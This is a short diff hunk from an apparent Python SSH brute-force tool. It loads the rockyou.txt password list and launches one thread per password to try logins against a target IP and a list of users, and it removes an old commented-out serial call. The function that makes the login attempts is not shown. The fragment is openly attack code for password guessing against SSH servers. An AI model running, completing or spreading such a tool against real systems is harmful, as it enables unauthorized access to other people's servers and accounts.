@@ -50,8 +50,6 @@ def main():
     passwords = open('rockyou.txt', 'r', encoding='latin-1').readlines()
 
     for password in passwords:
-            # Perform a brute-force attempt using the current username and password
-       #     brute_force_ssh(hostname, port, users, password.rstrip())
         password = password.strip()
         t = Thread(target=brute_force_ssh, args=(target_ip, port, users, password))
         t.start()
